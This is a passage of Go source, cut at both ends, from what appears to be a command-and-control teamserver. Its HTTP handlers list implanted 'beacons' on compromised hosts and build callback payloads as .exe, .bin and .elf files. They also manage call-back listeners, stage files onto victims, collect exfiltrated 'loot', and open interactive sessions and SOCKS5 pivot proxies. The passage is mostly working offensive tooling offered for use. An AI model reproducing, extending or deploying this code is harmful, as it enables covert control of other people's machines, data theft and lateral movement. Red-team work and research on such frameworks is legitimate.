		}
		if r == ' ' || r == '\t' || r == '\r' || r == '\n' {
			if b.Len() > 0 {
				fields = append(fields, b.String())
				b.Reset()
			}
			continue
		}
		b.WriteRune(r)
	}
	if b.Len() > 0 {
		fields = append(fields, b.String())
	}
	return fields
}

func splitSensitiveAssignment(field string) (string, string, bool) {
	for _, sep := range []string{"=", ":"} {
		idx := strings.Index(field, sep)
		if idx <= 0 || idx == len(field)-1 {
			continue
		}
		key := field[:idx]
		if isSensitiveArgKey(key) {
			return key, field[idx+1:], true
		}
	}
	return "", "", false
}

func isSensitiveArgKey(field string) bool {
	key := strings.ToLower(strings.Trim(field, "-/"))
	key = strings.TrimRight(key, ":=")
	switch key {
	case "password", "passwd", "pass", "pwd", "token", "secret", "apikey", "api-key",
		"access-token", "refresh-token", "authorization", "auth", "credential", "credentials":
		return true
	default:
		return false
	}
}

func (h *Handler) HandleGetSessions(w http.ResponseWriter, r *http.Request) {
	beacons := h.store.ListBeacons()
	type item struct {
		ID           uint32 `json:"id"`
		Hostname     string `json:"hostname"`
		Username     string `json:"username"`
		ProcessName  string `json:"process_name"`
		ProcessID    uint32 `json:"process_id"`
		Arch         uint8  `json:"arch"`
		Platform     uint8  `json:"platform"`
		Integrity    uint8  `json:"integrity"`
		Sleep        uint32 `json:"sleep"`
		Jitter       uint32 `json:"jitter"`
		FirstSeen    int64  `json:"first_seen"`
		LastSeen     int64  `json:"last_seen"`
		Alive        bool   `json:"alive"`
		ListenerID   uint32 `json:"listener_id"`
		ListenerName string `json:"listener_name"`
		Mode         string `json:"mode"`
		ShellActive  bool   `json:"shell_active"`
		SocksActive  bool   `json:"socks_active"`
		SocksHost    string `json:"socks_host,omitempty"`
		SocksPort    int    `json:"socks_port,omitempty"`
	}
	resp := make([]item, len(beacons))
	for i, b := range beacons {
		lName := "Unknown"
		if l := h.store.GetListener(b.ListenerID); l != nil {
			lName = l.Name
		}
		resp[i] = item{
			ID:           b.ID,
			Hostname:     b.Hostname,
			Username:     b.Username,
			ProcessName:  b.ProcessName,
			ProcessID:    b.ProcessID,
			Arch:         b.Arch,
			Platform:     b.Platform,
			Integrity:    b.Integrity,
			Sleep:        b.Sleep,
			Jitter:       b.Jitter,
			FirstSeen:    b.FirstSeen.Unix(),
			LastSeen:     b.LastSeen.Unix(),
			Alive:        b.IsAlive() || h.store.IsSession(b.ID),
			ListenerID:   b.ListenerID,
			ListenerName: lName,
			Mode: func() string {
				if h.store.IsSession(b.ID) {
					return "session"
				}
				return "beacon"
			}(),
			ShellActive: h.store.IsShell(b.ID),
			SocksActive: h.store.HasSocksProxy(b.ID),
			SocksHost: func() string {
				if p := h.store.GetSocksProxy(b.ID); p != nil {
					return p.Host
				}
				return ""
			}(),
			SocksPort: func() int {
				if p := h.store.GetSocksProxy(b.ID); p != nil {
					return p.Port
				}
				return 0
			}(),
		}
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleGetResults(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	var since int64
	if s := r.URL.Query().Get("since"); s != "" {
		since, _ = strconv.ParseInt(s, 10, 64)
	}

	results := h.store.GetResultsSince(beaconID, since)
	type item struct {
		Label         uint32 `json:"label"`
		BeaconID      uint32 `json:"beacon_id"`
		Flags         uint16 `json:"flags"`
		Type          uint8  `json:"type"`
		Filename      string `json:"filename,omitempty"`
		Output        string `json:"output"`
		ExitCode      int32  `json:"exit_code"`
		Stdout        string `json:"stdout"`
		Stderr        string `json:"stderr"`
		Exception     string `json:"exception"`
		DurationMS    uint32 `json:"duration_ms"`
		Truncated     bool   `json:"truncated"`
		Mode          string `json:"mode"`
		BridgeVersion string `json:"bridge_version"`
		Diagnostics   string `json:"diagnostics"`
		ReceivedAt    int64  `json:"received_at"`
	}
	resp := make([]item, len(results))
	for i, res := range results {
		resp[i] = item{
			Label:         res.Label,
			BeaconID:      res.BeaconID,
			Flags:         res.Flags,
			Type:          res.Type,
			Filename:      res.Filename,
			Output:        res.Output,
			ExitCode:      res.ExitCode,
			Stdout:        res.Stdout,
			Stderr:        res.Stderr,
			Exception:     res.Exception,
			DurationMS:    res.DurationMS,
			Truncated:     res.Truncated,
			Mode:          res.Mode,
			BridgeVersion: res.BridgeVersion,
			Diagnostics:   res.Diagnostics,
			ReceivedAt:    res.ReceivedAt.Unix(),
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleBuild(w http.ResponseWriter, r *http.Request) {
	if h.beaconSrc == "" {
		http.Error(w, "build not configured — start teamserver with -beacon-src <path>", http.StatusNotImplemented)
		return
	}

	var req struct {
		ListenerID  uint32 `json:"listener_id"`
		SleepMS     int    `json:"sleep_ms"`
		JitterPct   int    `json:"jitter_pct"`
		Format      string `json:"format"`
		SessionPort int    `json:"session_port"`
		Platform    string `json:"platform"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	l := h.store.GetListener(req.ListenerID)
	if l == nil {
		http.Error(w, "unknown listener_id", http.StatusBadRequest)
		return
	}
	if l.Host == "" {
		http.Error(w, "listener has no public host configured", http.StatusBadRequest)
		return
	}

	platform := req.Platform
	if platform == "" {
		platform = "windows"
	}

	data, err := builder.Build(builder.BuildParams{
		ServerHost:       l.Host,
		ServerPort:       l.Port,
		SleepMS:          req.SleepMS,
		JitterPct:        req.JitterPct,
		BeaconSrc:        h.beaconSrc,
		UseHTTPS:         l.Scheme == "https",
		IgnoreCertErrors: l.AutoCert,
		Format:           req.Format,
		SessionPort:      req.SessionPort,
		Platform:         platform,
	})
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}

	var filename string
	if platform == "linux" {
		filename = "beacon.elf"
	} else if req.Format == "bin" {
		filename = "beacon.bin"
	} else {
		filename = "beacon.exe"
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", contentDispositionAttachment(filename))
	if _, err := w.Write(data); err != nil {
		ui.Errorf("build", "write %s: %v", filename, err)
	}
}

func (h *Handler) HandleListListeners(w http.ResponseWriter, r *http.Request) {
	listeners := h.store.ListListeners()
	type item struct {
		ID            uint32            `json:"id"`
		Name          string            `json:"name"`
		Scheme        string            `json:"scheme"`
		Host          string            `json:"host"`
		BindAddr      string            `json:"bind_addr"`
		Port          int               `json:"port"`
		CustomHeaders map[string]string `json:"custom_headers,omitempty"`
		IsDefault     bool              `json:"is_default"`
		AutoCert      bool              `json:"auto_cert"`
	}
	resp := make([]item, len(listeners))
	for i, l := range listeners {
		resp[i] = item{
			ID:            l.ID,
			Name:          l.Name,
			Scheme:        l.Scheme,
			Host:          l.Host,
			BindAddr:      l.BindAddr,
			Port:          l.Port,
			CustomHeaders: l.CustomHeaders,
			IsDefault:     l.IsDefault,
			AutoCert:      l.AutoCert,
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (h *Handler) HandleCreateListener(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name          string            `json:"name"`
		Scheme        string            `json:"scheme"`
		Host          string            `json:"host"`
		BindAddr      string            `json:"bind_addr"`
		Port          int               `json:"port"`
		CertPEM       string            `json:"cert_pem"`
		KeyPEM        string            `json:"key_pem"`
		CustomHeaders map[string]string `json:"custom_headers"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		http.Error(w, "name required", http.StatusBadRequest)
		return
	}
	if req.Scheme != "http" && req.Scheme != "https" {
		http.Error(w, "scheme must be http or https", http.StatusBadRequest)
		return
	}
	if req.Host == "" {
		http.Error(w, "host required", http.StatusBadRequest)
		return
	}
	if req.Port < 1 || req.Port > 65535 {
		http.Error(w, "port must be 1-65535", http.StatusBadRequest)
		return
	}
	if req.Port == h.managementPort {
		http.Error(w, "port already in use by management server", http.StatusConflict)
		return
	}
	if h.store.PortInUse(req.Port) {
		http.Error(w, "port already in use by another listener", http.StatusConflict)
		return
	}
	if req.CertPEM != "" && req.KeyPEM == "" {
		http.Error(w, "key_pem is required when cert_pem is provided", http.StatusBadRequest)
		return
	}
	bindAddr := req.BindAddr
	if bindAddr == "" {
		bindAddr = "0.0.0.0"
	}

	l := &models.Listener{
		Name:          req.Name,
		Scheme:        req.Scheme,
		Host:          req.Host,
		BindAddr:      bindAddr,
		Port:          req.Port,
		CustomHeaders: req.CustomHeaders,
	}
	if req.CertPEM != "" {
		l.CertPEM = []byte(req.CertPEM)
		l.KeyPEM = []byte(req.KeyPEM)
	}

	h.store.AddListener(l)

	if err := h.lm.Start(l, newBeaconMux(h)); err != nil {
		h.store.RemoveListener(l.ID)
		http.Error(w, "failed to start listener: "+err.Error(), http.StatusInternalServerError)
		return
	}
	h.p.SaveListeners(h.store.ListListeners())
	h.hub.Publish("listeners", "add", map[string]interface{}{
		"id": l.ID, "name": l.Name, "scheme": l.Scheme, "host": l.Host,
		"bind_addr": l.BindAddr, "port": l.Port, "auto_cert": l.AutoCert,
	})
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("listener", fmt.Sprintf("operator '%s' created listener: %s %s://:%d", op, l.Name, l.Scheme, l.Port))

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(struct {
		ID uint32 `json:"id"`
	}{ID: l.ID})
}

func (h *Handler) HandleDeleteListener(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	id := uint32(id64)

	l := h.store.GetListener(id)
	if l == nil {
		http.Error(w, "unknown listener", http.StatusNotFound)
		return
	}
	if l.IsDefault {
		http.Error(w, "cannot delete default listener", http.StatusForbidden)
		return
	}
	if err := h.lm.Stop(id); err != nil {
		http.Error(w, "stop failed: "+err.Error(), http.StatusInternalServerError)
		return
	}
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("listener", fmt.Sprintf("operator '%s' deleted listener: %s #%d", op, l.Name, id))
	h.store.RemoveListener(id)
	h.hub.Publish("listeners", "delete", map[string]interface{}{"id": id})
	h.p.SaveListeners(h.store.ListListeners())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleUpload(w http.ResponseWriter, r *http.Request) {
	if err := parseMultipartLimited(w, r, maxUploadBodyBytes); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}
	defer cleanupMultipart(r)

	beaconIDStr := r.FormValue("beacon_id")
	destPath := r.FormValue("dest_path")
	beaconIDVal, err := strconv.ParseUint(beaconIDStr, 10, 32)
	if err != nil || destPath == "" {
		http.Error(w, "missing beacon_id or dest_path", http.StatusBadRequest)
		return
	}
	if len(destPath) > 260 {
		http.Error(w, "dest_path exceeds MAX_PATH (260 bytes)", http.StatusBadRequest)
		return
	}
	beaconID := uint32(beaconIDVal)

	if h.store.GetBeacon(beaconID) == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	file, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "missing file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	fileBytes, err := readFormFileLimited(file, maxUploadFileBytes)
	if err != nil {
		if errors.Is(err, errFileTooLarge) {
			http.Error(w, "file too large", http.StatusRequestEntityTooLarge)
			return
		}
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}

	const chunkSize = 64 * 1024
	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])
	pathBytes := []byte(destPath)
	pathLen := uint16(len(pathBytes))

	total := len(fileBytes)
	chunkIndex := uint32(0)
	offset := 0

	enqueue := func(chunk []byte, isFirst, isLast bool) {
		var flags uint16 = protocol.FlagFragmented
		if isLast {
			flags = protocol.FlagLastFragment
		}
		var data []byte
		if isFirst {
			data = append(data, byte(pathLen), byte(pathLen>>8))
			data = append(data, pathBytes...)
		}
		data = append(data, chunk...)
		task := &models.Task{
			BeaconID:   beaconID,
			Type:       protocol.TaskFileStage,
			Code:       0,
			Flags:      flags,
			Label:      label,
			Identifier: chunkIndex,
			Data:       data,
			Status:     models.TaskStatusPending,
		}
		if h.sessionListener != nil && h.store.IsSession(beaconID) {
			taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
				Type:       protocol.TaskFileStage,
				Flags:      flags,
				Label:      label,
				Identifier: chunkIndex,
				Length:     uint32(len(data)),
			})
			taskMsg = append(taskMsg, data...)
			if err := h.sessionListener.SendTask(beaconID, taskMsg); err == nil {
				task.Status = models.TaskStatusSent
			}
		}
		h.store.QueueTask(task)
		chunkIndex++
	}

	if total == 0 {
		enqueue(nil, true, true)
	} else {
		for offset < total {
			end := offset + chunkSize
			if end > total {
				end = total
			}
			enqueue(fileBytes[offset:end], offset == 0, end >= total)
			offset = end
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"label":  label,
		"chunks": chunkIndex,
	})
}

func (h *Handler) HandleListFiles(w http.ResponseWriter, r *http.Request) {
	files := h.store.ListExfilFiles()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(files)
}

func (h *Handler) HandleGetFile(w http.ResponseWriter, r *http.Request) {
	labelStr := r.PathValue("label")
	labelVal, err := strconv.ParseUint(labelStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid label", http.StatusBadRequest)
		return
	}
	label := uint32(labelVal)

	entry := h.store.GetExfilFile(label)
	if entry == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	diskPath := lootPath(entry.Label, entry.Filename)
	if _, err := os.Stat(diskPath); os.IsNotExist(err) {
		diskPath = legacyLootPath(entry.Label, entry.Filename)
	}
	w.Header().Set("Content-Disposition", contentDispositionAttachment(entry.Filename))
	http.ServeFile(w, r, diskPath)
}

func (h *Handler) HandleDeleteFile(w http.ResponseWriter, r *http.Request) {
	labelStr := r.PathValue("label")
	labelVal, err := strconv.ParseUint(labelStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid label", http.StatusBadRequest)
		return
	}
	label := uint32(labelVal)

	entry := h.store.GetExfilFile(label)
	if entry == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	for _, diskPath := range []string{lootPath(entry.Label, entry.Filename), legacyLootPath(entry.Label, entry.Filename)} {
		if err := os.Remove(diskPath); err != nil && !os.IsNotExist(err) {
			ui.Errorf("loot", "remove %s: %v", diskPath, err)
		}
	}
	h.store.DeleteExfilFile(label)
	h.hub.Publish("loot", "delete", map[string]interface{}{"label": label})
	h.p.SaveLoot(h.store.ListExfilFiles())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleKillBeacon(w http.ResponseWriter, r *http.Request) {
	idStr := r.PathValue("id")
	op, _ := r.Context().Value(operatorKey).(string)
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		h.logEvent("kill", fmt.Sprintf("operator '%s' attempted beacon action with invalid id %q", op, idStr))
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	b := h.store.GetBeacon(beaconID)
	if b == nil {
		h.logEvent("kill", fmt.Sprintf("operator '%s' attempted beacon action on unknown beacon #%d", op, beaconID))
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	deleteRequested := r.URL.Query().Get("delete") == "1" ||
		strings.EqualFold(r.URL.Query().Get("delete"), "true") ||
		strings.EqualFold(r.URL.Query().Get("action"), "delete")
	if deleteRequested && h.store.IsSession(beaconID) {
		h.logEvent("kill", fmt.Sprintf("operator '%s' delete blocked for active session beacon #%d %s", op, beaconID, b.Hostname))
		http.Error(w, "active session cannot be deleted; close session first", http.StatusConflict)
		return
	}
	if deleteRequested {
		if seenRaw := strings.TrimSpace(r.URL.Query().Get("last_seen")); seenRaw != "" {
			seen, parseErr := strconv.ParseInt(seenRaw, 10, 64)
			if parseErr != nil {
				h.logEvent("kill", fmt.Sprintf("operator '%s' delete rejected for beacon #%d %s: invalid last_seen", op, beaconID, b.Hostname))
				http.Error(w, "invalid last_seen", http.StatusBadRequest)
				return
			}
			if b.LastSeen.Unix() > seen && b.IsAlive() {
				h.logEvent("kill", fmt.Sprintf("operator '%s' delete canceled for beacon #%d %s: beacon checked in again", op, beaconID, b.Hostname))
				http.Error(w, "beacon checked in again", http.StatusConflict)
				return
			}
		}
		h.logEvent("kill", fmt.Sprintf("operator '%s' removed dead beacon #%d %s", op, beaconID, b.Hostname))
		h.store.DeleteBeacon(beaconID)
		h.hub.Publish("sessions", "delete", map[string]interface{}{"id": beaconID})
		h.store.RemoveSession(beaconID)
		h.p.SaveBeacons(h.store.ListBeacons())
		w.WriteHeader(http.StatusNoContent)
		return
	}

	if !b.IsAlive() && !h.store.IsSession(beaconID) {
		h.logEvent("kill", fmt.Sprintf("operator '%s' removed dead beacon #%d %s", op, beaconID, b.Hostname))
		h.store.DeleteBeacon(beaconID)
		h.hub.Publish("sessions", "delete", map[string]interface{}{"id": beaconID})
		h.store.RemoveSession(beaconID)
		h.p.SaveBeacons(h.store.ListBeacons())
		w.WriteHeader(http.StatusNoContent)
		return
	}

	h.logEvent("kill", fmt.Sprintf("operator '%s' kill sent #%d %s", op, beaconID, b.Hostname))

	var killLabelBytes [4]byte
	if _, err := rand.Read(killLabelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(killLabelBytes[:])
	task := &models.Task{
		Label:     label,
		BeaconID:  beaconID,
		Type:      protocol.TaskExit,
		Code:      protocol.CodeExitNormal,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	}

	if h.sessionListener != nil && h.store.IsSession(beaconID) {
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:  protocol.TaskExit,
			Code:  protocol.CodeExitNormal,
			Label: label,
		})
		if err := h.sessionListener.SendTask(beaconID, taskMsg); err == nil {
			task.Status = models.TaskStatusSent
		}
	}
	h.store.QueueTask(task)

	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleGetEvents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(h.store.ListEvents())
}

func (h *Handler) HandlePostEvent(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Type    string `json:"type"`
		Message string `json:"message"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 64<<10)).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	operator, _ := r.Context().Value(operatorKey).(string)
	operator = normalizeMCPOperator(operator)
	message := strings.TrimSpace(req.Message)
	if message == "" {
		http.Error(w, "message required", http.StatusBadRequest)
		return
	}
	message = fmt.Sprintf("operator '%s' %s", operator, message)
	evt := &models.Event{
		Type:      strings.TrimSpace(req.Type),
		Message:   message,
		Timestamp: time.Now(),
	}
	if evt.Type == "" {
		evt.Type = "operator"
	}
	h.store.AddEvent(evt)
	h.hub.Publish("events", "add", evt)
	h.p.SaveEvents(h.store.ListEvents())
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(evt)
}

func (h *Handler) HandleGetTerminal(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	state := h.store.GetTerminal(uint32(id64))
	if state == nil {
		state = &models.TerminalState{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(state)
}

func (h *Handler) HandlePutTerminal(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	var state models.TerminalState
	if err := json.NewDecoder(r.Body).Decode(&state); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	h.store.SetTerminal(uint32(id64), &state)
	h.p.SaveTerminals(h.store.ListTerminals())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleChatList(w http.ResponseWriter, r *http.Request) {
	limit := 200
	if raw := r.URL.Query().Get("limit"); raw != "" {
		if parsed, err := strconv.Atoi(raw); err == nil {
			limit = parsed
		}
	}
	if limit < 0 {
		limit = 0
	}
	if limit > 1000 {
		limit = 1000
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(h.store.ListChatMessages(limit))
}

func (h *Handler) HandleChatPost(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Message string `json:"message"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 64<<10)).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	operator, _ := r.Context().Value(operatorKey).(string)
	msg, err := h.addChatMessage(operator, req.Message)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(msg)
}

func (h *Handler) HandleInteractive(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BeaconID uint32 `json:"beacon_id"`
		Port     uint16 `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	beacon := h.store.GetBeacon(req.BeaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}
	if h.store.IsSession(req.BeaconID) {
		http.Error(w, "beacon already in session mode", http.StatusConflict)
		return
	}

	// Use the listener's public host — same IP the beacon was built with
	host := ""
	if l := h.store.GetListener(beacon.ListenerID); l != nil {
		host = l.Host
	}
	if host == "" {
		http.Error(w, "cannot determine beacon's server host", http.StatusInternalServerError)
		return
	}

	data := protocol.EncodeInteractiveReq(host, req.Port)
	var labelBytes [4]byte
	rand.Read(labelBytes[:])
	label := binary.LittleEndian.Uint32(labelBytes[:])

	h.store.QueueTask(&models.Task{
		Label:     label,
		BeaconID:  req.BeaconID,
		Type:      protocol.TaskInteractive,
		Code:      0,
		Data:      data,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	})

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("task", fmt.Sprintf("operator '%s' requested interactive for #%d", op, req.BeaconID))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Label uint32 `json:"label"`
	}{Label: label})
}

func (h *Handler) HandleCloseSession(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)
	if h.sessionListener == nil || !h.store.IsSession(beaconID) {
		http.Error(w, "no active session", http.StatusNotFound)
		return
	}
	h.sessionListener.CloseSession(beaconID)
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("session", fmt.Sprintf("operator '%s' closed session #%d", op, beaconID))
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleStartSocks(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BeaconID uint32 `json:"beacon_id"`
		Port     int    `json:"port"`
		Bind     string `json:"bind"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	beacon := h.store.GetBeacon(req.BeaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}
	if !h.store.IsSession(req.BeaconID) {
		http.Error(w, "beacon not in session mode", http.StatusConflict)
		return
	}
	if h.socksMgr == nil {
		http.Error(w, "socks manager not available", http.StatusInternalServerError)
		return
	}

	// Send TaskSocksStart to beacon via session TCP
	// data = 2-byte LE session listener port
	portLE := make([]byte, 2)
	if h.sessionListener != nil {
		binary.LittleEndian.PutUint16(portLE, uint16(h.sessionListener.Port))
	}
	var labelBytes [4]byte
	rand.Read(labelBytes[:])
	label := binary.LittleEndian.Uint32(labelBytes[:])

	taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
		Type:   protocol.TaskSocksStart,
		Label:  label,
		Length: 2,
	})
	taskMsg = append(taskMsg, portLE...)
	if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
		http.Error(w, "failed to send task to beacon: "+err.Error(), http.StatusInternalServerError)
		return
	}

	host, port, err := h.socksMgr.StartProxy(req.BeaconID, req.Port, req.Bind)
	if err != nil {
		http.Error(w, err.Error(), http.StatusConflict)
		return
	}

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("socks", fmt.Sprintf("operator '%s' started SOCKS5 proxy for #%d on %s:%d", op, req.BeaconID, host, port))

	h.hub.Publish("socks", "started", map[string]interface{}{
		"beacon_id": req.BeaconID,
		"host":      host,
		"port":      port,
	})

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"beacon_id": req.BeaconID,
		"host":      host,
		"port":      port,
		"status":    "active",
	})
}

func (h *Handler) HandleStopSocks(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	if h.socksMgr == nil {
		http.Error(w, "socks manager not available", http.StatusInternalServerError)
		return
	}

	// Send TaskSocksStop to beacon if session is active
	if h.sessionListener != nil && h.store.IsSession(beaconID) {
		var labelBytes [4]byte
		rand.Read(labelBytes[:])
		label := binary.LittleEndian.Uint32(labelBytes[:])
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:  protocol.TaskSocksStop,
			Label: label,
		})
		h.sessionListener.SendTask(beaconID, taskMsg) // best-effort
	}

	h.socksMgr.StopProxy(beaconID)
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("socks", fmt.Sprintf("operator '%s' stopped SOCKS5 proxy for #%d", op, beaconID))
	h.hub.Publish("socks", "stopped", map[string]interface{}{
		"beacon_id": beaconID,
	})
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleListSocks(w http.ResponseWriter, r *http.Request) {
	if h.socksMgr == nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode([]interface{}{})
		return
	}

	proxies := h.store.ListSocksProxies()
	type item struct {
		BeaconID     uint32 `json:"beacon_id"`
		Host         string `json:"host"`
		Port         int    `json:"port"`
		ChannelCount int    `json:"channel_count"`
		Status       string `json:"status"`
	}
	resp := make([]item, len(proxies))
	for i, p := range proxies {
		p.Mu.RLock()
		chanCount := len(p.Channels)
		p.Mu.RUnlock()
		resp[i] = item{
			BeaconID:     p.BeaconID,
			Host:         p.Host,
			Port:         p.Port,
			ChannelCount: chanCount,
			Status:       "active",
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// chatRateLimit applies a per-operator token bucket: burst of 10, then 1 message/second sustained.
// Returns true if the message is allowed, false if the operator has
// exceeded their quota.
func (h *Handler) chatRateLimit(username string) bool {
	h.chatLimitersMu.Lock()
	defer h.chatLimitersMu.Unlock()
	if h.chatLimiters == nil {
		h.chatLimiters = make(map[string]*rate.Limiter)
	}
	lim, ok := h.chatLimiters[username]
	if !ok {
		// Burst of 10, then 1 token/second sustained.
		lim = rate.NewLimiter(rate.Every(time.Second), 10)
		h.chatLimiters[username] = lim
	}
	return lim.Allow()
}

func (h *Handler) addChatMessage(operator string, raw string) (*models.ChatMessage, error) {
	operator = strings.TrimSpace(operator)
	if operator == "" {
		operator = mcpDefaultOperator
	}
	msg := strings.TrimSpace(raw)
	if msg == "" {
		return nil, fmt.Errorf("message required")
	}
	if len(msg) > 2000 {
		return nil, fmt.Errorf("message too long")
	}
	if !h.chatRateLimit(operator) {
		return nil, fmt.Errorf("rate limited")
	}
	saved, err := h.store.AddChatMessage(operator, msg)
	if err != nil {
		return nil, err
	}
	h.hub.Publish("chat", "add", saved)
	return saved, nil
}

func parseWindowsArgLine(raw string) ([]string, error) {
	var args []string
	for i := 0; i < len(raw); {
		for i < len(raw) && (raw[i] == ' ' || raw[i] == '\t') {
			i++
		}
		if i >= len(raw) {
			break
		}

		var arg strings.Builder
		inQuotes := false
		for i < len(raw) {
			if !inQuotes && (raw[i] == ' ' || raw[i] == '\t') {
				break
			}
			if raw[i] == '"' {
				if inQuotes && i+1 < len(raw) && raw[i+1] == '"' {
					arg.WriteByte('"')
					i += 2
					continue
				}
				inQuotes = !inQuotes
				i++
				continue
			}
			if raw[i] == '\\' {
				slashes := 0
				for i < len(raw) && raw[i] == '\\' {
					slashes++
					i++
				}
				if i < len(raw) && raw[i] == '"' {
					for j := 0; j < slashes/2; j++ {
						arg.WriteByte('\\')
					}
					if slashes%2 == 0 {
						inQuotes = !inQuotes
					} else {
						arg.WriteByte('"')
					}
					i++
					continue
				}
				for j := 0; j < slashes; j++ {
					arg.WriteByte('\\')
				}
				continue
			}
			arg.WriteByte(raw[i])
			i++
		}
		args = append(args, arg.String())
	}
	return args, nil
}

func resolveInlineMode(raw string) (uint32, string, error) {
	switch strings.ToLower(strings.TrimSpace(raw)) {
	case "", "auto", "bridge":
		return protocol.InlineModeBridge, "bridge", nil
	case "direct":
